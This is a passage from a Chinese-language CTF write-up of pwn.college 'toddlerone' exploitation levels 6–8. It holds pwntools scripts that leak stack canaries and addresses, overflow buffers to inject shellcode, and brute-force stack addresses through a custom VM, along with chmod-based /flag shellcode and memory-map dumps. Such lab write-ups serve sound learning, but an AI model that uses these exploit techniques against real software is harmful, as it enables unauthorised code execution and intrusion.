p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>使用 <code>seccomp_rule_add</code>限制了系统调用，由于限制系统调用后代码使用了 <code>puts</code>函数，所以为了保证程序正常运行到返回，必须要保证 <code>write</code>系统调用正常使用。</p>
<p>在代码中我们只能保证两个系统调用可以正常使用。<code>write</code>占用了其中一个，所以我们只能使用 <code>chmod</code>系统调用更改flag文件的权限，然后读取flag中的内容。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64
section .data
    filename db &#39;&#x2F;flag&#39;, 0
    mode equ 0x1a4 ; 十六进制的644  ---注意这里的传参 不能直接写644，那是十进制数，之前一直写0644也不对，他好像不能直接识别为八进制
section .text
global _start
_start:
    mov rax, 90
    lea rdi, [rel filename]
    mov rsi, mode
    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level6.1"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level6.1"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">0x68</span>  <span class="token operator">+</span> <span class="token number">1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


init_payload_size <span class="token operator">=</span> <span class="token number">0x70</span> 
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xD0</span> <span class="token operator">-</span> <span class="token number">0xD0</span> <span class="token operator">-</span> <span class="token number">0x70</span><span class="token punctuation">)</span>

real_payload_size <span class="token operator">=</span> <span class="token number">0x70</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level6/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
<span class="token comment"># real_payload = shellcode + 46 * b'a' + p32(1) + p32(0x5A) + 12*b'A'  + canary_value +  8*b'C'+ return_address</span>
real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x5A</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token operator">*</span><span class="token string">b'A'</span>  <span class="token operator">+</span> canary_value <span class="token operator">+</span>  <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'C'</span><span class="token operator">+</span> return_address
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token triple-quoted-string string">"""

    mov rax, 90
    lea rdi, [rel filename]
    mov rsi, mode
    syscall


    push 0x66
    mov rdi, rsp
    push 4
    pop rsi
    push 0x5A
    pop rax
    syscall
    times 10 nop

"""</span>


<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level6.0"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level6.0"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">0x68</span>  <span class="token operator">+</span> <span class="token number">1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


init_payload_size <span class="token operator">=</span> <span class="token number">0x80</span> 
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xE0</span> <span class="token operator">-</span> <span class="token number">0xE0</span> <span class="token operator">-</span> <span class="token number">0x80</span><span class="token punctuation">)</span>

real_payload_size <span class="token operator">=</span> <span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level6/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token number">60</span><span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span>  <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'C'</span><span class="token operator">+</span> return_address
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>这一关增加了虚拟架构。我们首先要寻找溢出点，发现在执行 <code>SYS</code>系统调用的 <code>write</code>调用时，我们可以从 <code>0x300 + 0x FF</code>开始，这样就可以溢出到保留的返回地址 <code>ret</code>。然后我们在将返回地址填充为栈空间的地址，这样就可以跳转到栈空间中执行shellcode。</p>
<p>但是在这一关中，没办法找到准确的 <code>buf</code>的栈地址，因为保留的栈帧不知道为什么变成0了。所以我们需要使用 <code>cat /proc/pid/maps</code>查看对应进程的stack空间起始地址，至于 <code>buf</code>的首地址，可以通过遍历来解决，注意step为 <code>0x08</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-exploitation~level7-0:~$ <span class="token function">cat</span> /proc/4218/maps
00400000-00404000 r-xp 00000000 07:17d <span class="token number">420</span>                               /home/hacker/exploit/level7/toddlerone_level7.0
00405000-00406000 r-xp 00004000 07:17d <span class="token number">420</span>                               /home/hacker/exploit/level7/toddlerone_level7.0
00406000-00407000 rwxp 00005000 07:17d <span class="token number">420</span>                               /home/hacker/exploit/level7/toddlerone_level7.0
00407000-00428000 rwxp 00000000 00:00 <span class="token number">0</span>                                  <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
7ffff7dce000-7ffff7df0000 r-xp 00000000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7df0000-7ffff7f68000 r-xp 00022000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7f68000-7ffff7fb6000 r-xp 0019a000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fb6000-7ffff7fba000 r-xp 001e7000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fba000-7ffff7fbc000 rwxp 001eb000 00:b35 <span class="token number">188511454</span>                 /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fbc000-7ffff7fc2000 rwxp 00000000 00:00 <span class="token number">0</span> 
7ffff7fcb000-7ffff7fce000 r--p 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>
7ffff7fce000-7ffff7fcf000 r-xp 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>
7ffff7fcf000-7ffff7fd0000 r-xp 00000000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7fd0000-7ffff7ff3000 r-xp 00001000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ff3000-7ffff7ffb000 r-xp 00024000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffc000-7ffff7ffd000 r-xp 0002c000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffd000-7ffff7ffe000 rwxp 0002d000 00:b35 <span class="token number">188511193</span>                 /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffe000-7ffff7fff000 rwxp 00000000 00:00 <span class="token number">0</span> 
7ffffffde000-7ffffffff000 rwxp 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>
ffffffffff600000-ffffffffff601000 <span class="token parameter variable">--xp</span> 00000000 00:00 <span class="token number">0</span>                  <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level7.1"</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
op arg1(value) arg2(register)

SYS \x40            exit --0x10   read 0x08
IMM \x08     

a 1
b 8
c 4

"""</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level7/shellcode.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> stack_address <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7ffffffde000</span><span class="token punctuation">,</span> <span class="token number">0x7ffffffff000</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>stack_address<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level7.1"</span><span class="token punctuation">)</span>
    data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">b'\x08\x00\x01'</span> <span class="token comment"># IMM a= \x00</span>
        <span class="token string">b'\x08\xFF\x08'</span> <span class="token comment"># IMM b = \xFF</span>
        <span class="token string">b'\x08\x21\x04'</span> <span class="token comment"># IMM c = \x21</span>
        <span class="token string">b'\x40\x01\x04'</span> <span class="token comment"># read  返回值是a</span>
        <span class="token string">b'\x08\xFF\x02'</span> <span class="token comment"># IMM i = \xFF</span>
    <span class="token punctuation">]</span>

    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your yancode:"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> shellcode
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"[+] Starting interpreter loop! Good luck!\n"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string">b'\xFF'</span><span class="token operator">+</span> <span class="token string">b'\xFF'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_address <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level7.0"</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
STM \x80         
SYS \x02            exit --0x10   read 0x04
IMM \x40     


a 4
b 8
c 1

"""</span>
stack_address <span class="token operator">=</span> <span class="token number">1</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level7/shellcode.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> stack_address <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7ffffffde000</span><span class="token punctuation">,</span> <span class="token number">0x7ffffffff000</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>stack_address<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level7.0"</span><span class="token punctuation">)</span>
    data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">b'\x04\x40\x00'</span> <span class="token comment"># IMM a= \x00</span>
        <span class="token string">b'\x08\x40\xFF'</span> <span class="token comment"># IMM b = \xFF</span>
        <span class="token string">b'\x01\x40\x21'</span> <span class="token comment"># IMM c = \x21</span>
        <span class="token string">b'\x04\x02\x04'</span> <span class="token comment"># read  返回值是a</span>
        <span class="token string">b'\x20\x40\xFF'</span> <span class="token comment"># IMM i = \xFF</span>
    <span class="token punctuation">]</span>

    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Good luck!"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> shellcode
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"[s] ... read_memory\n"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string">b'\xFF'</span><span class="token operator">+</span> <span class="token string">b'\xFF'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_address <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>第8关跟第7关一样，但开启了canary和ASLR。所以不能采用爆破的思路解决了。观察栈空间发现 <code>rsp+0x0000</code>处的内容刚好和main函数的栈基址相差 <code>0xF8</code>，但我们只能显示处 <code>&amp;buf+0x300</code>之后的字节内容，无法显示之前的内容。所以只能再想办法看看返回地址后是否有其他的地址可以泄露。</p>
<p>果然，在 <code>main函数返回地址处 + 8个偏移量</code>发现了和 <code>rsp+0x0000</code>处一样的内容。<code>rsp+0x0000</code>处的参数意义是 <code>main函数argv参数的地址</code>。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">+---------------------------------+-------------------------+--------------------+
<span class="token operator">|</span>                  Stack location <span class="token operator">|</span>            Data <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> <span class="token operator">|</span>      Data <span class="token punctuation">(</span>LE int<span class="token punctuation">)</span> <span class="token operator">|</span>
+---------------------------------+-------------------------+--------------------+
<span class="token operator">|</span> 0x00007ffd2a17a3c0 <span class="token punctuation">(</span>rsp+0x0000<span class="token punctuation">)</span> <span class="token operator">|</span> d8 a8 <span class="token number">17</span> 2a fd 7f 00 00 <span class="token operator">|</span> 0x00007ffd2a17a8d8 <span class="token operator">|</span>
<span class="token operator">|</span> 0x00007ffd2a17a3c8 <span class="token punctuation">(</span>rsp+0x0008<span class="token punctuation">)</span> <span class="token operator">|</span> b8 <span class="token number">59</span> 5b 5b 01 00 00 00 <span class="token operator">|</span> 0x000000015b5b59b8 <span class="token operator">|</span>
<span class="token operator">|</span> 0x00007ffd2a17a3d0 <span class="token punctuation">(</span>rsp+0x0010<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">31</span> 0a 00 00 00 00 00 00 <span class="token operator">|</span> 0x0000000000000a31 <span class="token operator">|</span>  <span class="token operator">&lt;</span>---- 这里是buf的起始地址
